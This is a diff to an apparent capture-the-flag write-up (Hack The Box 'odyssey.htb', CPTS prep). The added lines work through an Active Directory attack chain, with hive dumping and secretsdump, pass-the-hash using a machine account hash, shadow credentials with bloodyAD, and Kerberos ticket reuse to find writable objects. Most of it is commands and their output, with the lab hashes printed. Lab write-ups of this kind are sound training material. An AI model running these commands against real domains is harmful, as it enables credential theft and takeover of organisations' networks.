@@ -1842,7 +1842,58 @@ evil-winrm -i 172.16.0.11 -u hacker -p 'Password123!'
 
 reg save HKLM\SAM C:\Windows\Temp\sam.hive /y
 reg save HKLM\SYSTEM C:\Windows\Temp\system.hive /y
+reg save HKLM\SECURITY C:\Windows\Temp\security.hive /y
 
-impacket-secretsdump LOCAL -system system.hive -sam sam.hive
+impacket-secretsdump LOCAL -system system.hive -sam sam.hive -security security.hive
+```
+{% endcode %}
+
+**we found a machine account hash to verify the MC name  from the authority shell**
+
+{% code overflow="wrap" %}
+```powershell
+hostname
+odyssey-db
+```
+{% endcode %}
+
+{% code overflow="wrap" %}
+```bash
+nxc smb 172.16.0.10 -u "ODYSSEY-DB$" -H "71bc6be8565f0c9871070c3912b1680d"
+# [+] odyssey.htb\ODYSSEY-DB$:71bc6be8565f0c9871070c3912b1680d
+```
+{% endcode %}
+
+<figure><img src=".gitbook/assets/image (52).png" alt=""><figcaption></figcaption></figure>
+
+**We have this ACL we can do shadow creds for this service account**&#x20;
+
+{% code overflow="wrap" %}
+```bash
+bloodyAD --host DC01.odyssey.htb -d odyssey.htb  --dc-ip 172.16.0.10 -u ODYSSEY-DB$ -p :71bc6be8565f0c9871070c3912b1680d add shadowCredentials "SVC-AEGIS-BUILD"
+
+
+# svc-aegis-build': bbc270509ec878cf516d5295fb4d774d
+
+export KRB5CCNAME=/home/gb05/Desktop/CPTS_PREP/svc-aegis-build.ccache
+nxc smb 172.16.0.10 -u "svc-aegis-build" -k --use-kcache
+# [+] ODYSSEY.HTB\svc-aegis-build from ccache
+
+bloodyAD -H DC01.odyssey.htb -d odyssey.htb -u svc-aegis-build --dc-ip 172.16.0.10 -k get writable
+
+distinguishedName: OU=Migrations,DC=odyssey,DC=htb
+permission: CREATE_CHILD
+
+distinguishedName: CN=svc-aegis-deploy,OU=Migrations,DC=odyssey,DC=htb
+permission: WRITE
+```
+{% endcode %}
+
+{% code overflow="wrap" %}
+```bash
+bloodyAD -H DC01.odyssey.htb -d odyssey.htb -u svc-aegis-build --dc-ip 172.16.0.10 -k get object "OU=Migrations,DC=odyssey,DC=htb"
+
+
+bloodyAD -H DC01.odyssey.htb -d odyssey.htb -u svc-aegis-build --dc-ip 172.16.0.10 -k get object "CN=svc-aegis-deploy,OU=Migrations,DC=odyssey,DC=htb"
 ```
 {% endcode %}
